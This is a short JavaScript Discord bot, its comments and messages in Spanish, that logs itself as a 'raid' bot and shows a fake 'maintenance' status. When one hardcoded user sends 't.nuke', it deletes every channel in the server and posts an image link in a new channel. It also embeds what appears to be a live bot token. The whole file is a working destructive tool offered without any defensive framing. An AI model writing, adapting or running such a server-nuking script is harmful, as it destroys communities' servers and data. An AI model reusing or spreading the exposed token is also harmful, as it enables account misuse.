const Discord = require("discord.js");
const client = new Discord.Client();

client.on("ready", () => {
    console.log(`Iniciando bot raid...`);
    console.log(`Cliente ${client.user.tag} listo`);
    console.log("Pikachu");
    presencia();  
    });

function presencia(){
  client.user.setPresence({
status: "dnd",
activity: {
  name: "En mantenimiento",
  type: "WATCHING"
 
}
  });
}
client.on("message", message => {
  if (message.author.id !== '724423864611766294') 
  return;
   if (message.content === 't.nuke') {
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`#si`, {
          type: 'text'
        }).then(channel => {
          channel.send("https://media.discordapp.net/attachments/839647779580149770/839889412988207104/cropped-1366-768-710940.png?width=842&height=473")
        })
         }
      })

client.login('OTAyMjkyNzM4NDkyNDg5Nzc4.YXcTmA.XZcDY-NVxljRnk8VEHdGnMPI41U');